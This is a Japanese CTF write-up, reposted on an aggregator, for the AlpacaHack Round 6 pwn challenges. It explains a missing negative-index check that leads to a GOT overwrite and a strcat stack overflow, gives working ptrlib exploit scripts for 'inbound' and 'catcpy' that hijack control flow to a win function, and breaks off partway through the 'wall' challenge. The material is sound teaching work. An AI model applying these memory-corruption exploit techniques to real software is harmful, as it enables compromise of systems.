---
title: AlpacaHack Round 6 (Pwn)のWriteup
url: https://buaq.net/go-270778.html
source: unSafe.sh - 不安全
date: 2024-11-04
fetch_date: 2025-10-06T19:13:38.186690
---

# AlpacaHack Round 6 (Pwn)のWriteup

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/70ecd29f95034e55e00f25236df66b18.jpg)

AlpacaHack Round 6 (Pwn)のWriteup

*2024-11-3 22:30:33
Author: [ptr-yudai.hatenablog.com(查看原文)](/jump-270778.htm)
阅读量:26
收藏*

---

AlpacaHackは[keymoon](https://x.com/kymn_)と[minaminao](https://x.com/vinami)が開発したCTFプラットフォームで、現在は[個人戦](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C4%BF%EF%BF%BD%EF%BF%BD%EF%BF%BD)をメインにした定期CTFが開催されています。
また、過去大会の問題にも挑戦できるため、復習にも便利なサイトです。[\*1](#f-151339c0 "CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能")
今回の問題も解き直すことができますので、参加を逃した方も挑戦してみてください。

[alpacahack.com](https://alpacahack.com/ctfs/round-6)

↑ここまで定型文

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103205636.png)

第六回の上位勢

* [はじめに](#はじめに)
* [inbound (57 solves)](#inbound-57-solves)
  + [問題概要](#問題概要)
  + [脆弱性](#脆弱性)
  + [攻撃](#攻撃)
* [catcpy (41 solves)](#catcpy-41-solves)
  + [問題概要](#問題概要-1)
  + [脆弱性](#脆弱性-1)
  + [攻撃](#攻撃-1)
* [wall (21 solves)](#wall-21-solves)
  + [問題概要](#問題概要-2)
  + [脆弱性](#脆弱性-2)
  + [攻撃](#攻撃-2)
    - [ROP (Return Oriented Programming)](#ROP-Return-Oriented-Programming)
    - [Libcリーク](#Libcリーク)
    - [GOT overwrite](#GOT-overwrite)
    - [Exploitコード](#Exploitコード)
* [ideabook (10 solves)](#ideabook-10-solves)
  + [問題概要](#問題概要-3)
  + [脆弱性](#脆弱性-3)
  + [攻撃](#攻撃-3)

## 問題概要

[グローバル変数](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A5%EF%BF%BD%EF%BF%BD%D1%BF%EF%BF%BD)に定義されたint型配列`slot`に値を1つ入れられます。

```
int slot[10];
...
int main() {
  int index, value;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

プログラムにはフラグを出力する`win`関数が定義されており、これを呼び出すことが目的です。

```
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

checksecでセキュリティ機構を確認すると、Partial RELRO, No canary[\*2](#f-01980f4a "ローカル変数で配列などを使っていない場合、gccの判断で自動的に無効化されます"), No PIEであることが確認できます。

```
$ checksec ./inbound
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)

slotにアクセスするインデクスを入力したあと、それが10以上である場合は範囲外参照としてプログラムを終了します。

```
  int index, value;
...
  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }
```

しかし、`index`はint型で定義されているため、負数であるかも検査すべきです。
`slot`よりも負の方向に何があるか、[gdb](https://d.hatena.ne.jp/keyword/gdb)で確認してみましょう。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20241103/20241103211841.png)

[グローバル変数](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A5%EF%BF%BD%EF%BF%BD%D1%BF%EF%BF%BD)slot周辺のメモリ

いくつかありますが、GOT (Global Offset Table)が書き換え可能領域[\*3](#f-0cfad9de "Full RELROでなければ書き換え可能です")にあるのがわかります。
ここにはlibcなどの外部ライブラリの関数を呼び出すときに使われる関数ポインタが格納されています。
つまり、ある関数のGOTを`win`関数のアドレスで上書きすると、その関数が呼ばれたときに`win`関数が呼び出されます。

このようにGOTを書き換えて任意の関数やROP gadgetなどを呼び出す攻撃をGOT overwriteと呼びます。

## 攻撃

GOT overwriteという方針が立ったら、次にどの関数のGOTを上書きするかを決めます。
まず、関数が呼び出される必要があるので、GOTを書き換えたあとに呼び出せる関数である必要があります。
[ソースコード](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)を確認すると、`printf`と`exit`が該当します。

```
...
  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

では`printf`のGOTを`win`関数に書き換えることはできるでしょうか？

残念ながら今回の問題では使えません。なぜなら、`slot`はint型の配列だからです。
`printf`はプログラム中ですでに何度か呼ばれているため、libc中の`printf`関数のアドレスに解決されています。
libcのアドレスは6バイトあるため、int型（4バイト）の書き換え1度では不十分です。

一方で`exit`はまだ呼び出されていないため、アドレスが解決されていません。
今回のプログラムはNo PIE（プログラム自身のアドレスは固定）であり、No PIEの場合アドレスは通常3バイトに収まる範囲に置かれます[\*4](#f-70e0f24c "GCCの場合であり、コンパイル時の設定で変えることもできます")。
したがって、`exit`のGOTであればint値の書き込みでも`win`関数のアドレスに制御することができます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

elf = ELF("../distfiles/inbound")
sock = Socket(HOST, PORT)

sock.sendlineafter("index: ", -14)
sock.sendlineafter("value: ", elf.symbol("win"))

sock.sh()
```

## 問題概要

グローバルバッファにデータを入れたあと、`main`関数のローカルバッファに`strcpy`か`strcat`を使ってコピーできます。

```
char g_buf[0x100];
...
int main() {
  int choice;
  char buf[0x100];

  memset(buf, 0, sizeof(buf));
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  puts("1. strcpy\n" "2. strcat");
  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1) return 1;

    switch (choice) {
      case 1:
        get_data();
        strcpy(buf, g_buf);
        break;

      case 2:
        get_data();
        strcat(buf, g_buf);
        break;

      default:
        return 0;
    }
  }
}
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)

両方ともバッファのサイズは0x100なので`strcpy`は問題ありません。
しかし、`strcat`はバッファサイズに関係なくデータを付加してしまうため、スタック[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%D0%A5%C3%A5%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%D0%A1%EF%BF%BD%EF%BF%BD%D5%A5%EF%BF%BD%EF%BF%BD%EF%BF%BD)が発生します。

今回の問題はstack canaryがないので、`main`関数のリターンアドレスを`win`関数のアドレスに書き換えることを目標にしましょう。

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## 攻撃

リターンアドレスを書き換える上で2つ問題があります。

1. NULL終端なので6バイトのリターンアドレスを1度に3バイトの`win`関数のアドレスにできない
2. `fgets`で入力を受け取るため、終端に改行コードが入ってしまう

1つめの問題は、何度か`strcat`を呼び出すことで解決できます。はじめに適当な長さの文字列でリターンアドレスの後半をNULLバイトを潰し、長さを1ずつ減らしていくことでNULLバイトを後ろから連続して書き込めます。

2つめの問題は、`fgets`に最大量の入力を入れることで解決できます。`fgets`は通常改行コードで終端しますが、「受け付ける入力サイズ-1」の長さを入力として与えると、最後をNULL終端として改行コードが入ることなく入力できます。

したがって、まず適度な長さの入力でリターンアドレスの高位ビットをNULL埋めし、次にfgetsに最大量の入力を与えることで`win`関数のアドレスを正しく与えられます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9999))

elf = ELF("../distfiles/catcpy")
sock = Socket(HOST, PORT)

for i in range(2):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("Data: ", "A"*0x7f)
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("Data: ", "A"*(0x98 + (4 - i)))

sock.sendlineafter("> ", "1")
sock.sendlineafter("Data: ", "A"*0x1b)
sock.sendlineafter("> ", "2")

sock.sendafter("Data: ", b"A"*(0x100-4) + p32(elf.symbol("win"))[:3])

sock.sendlineafter("> ", "3")

sock.sh()
```

## 問題概要

メッセージと名前を入力できるだけのプログラムです。

```
#include <stdio.h>
#include <stdlib.h>

char message[4096];

void get_name(void) {
  char name[128];
  printf("What is your name? ");
  scanf("%128[^\n]%*c", name);
  printf("Message from %s: \"%s\"\n", name, message);
}

int main(int argc, char **argv) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  printf("Message: ");
  scanf("%4096[^\n]%*c", message);
  get_name();
  return 0;
}
```

セキュリティ機構はこれまでの問題と同様にNo PIE, No canary, Partial RELROです。

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)

`get_name`関数を見ると、128バイトのバッファに対して`scanf`で128バイトのデータを入力しています。
しかし、`scanf`で文字列を入力するときは与えられたサイズに関係なくNULL終端を強要するため...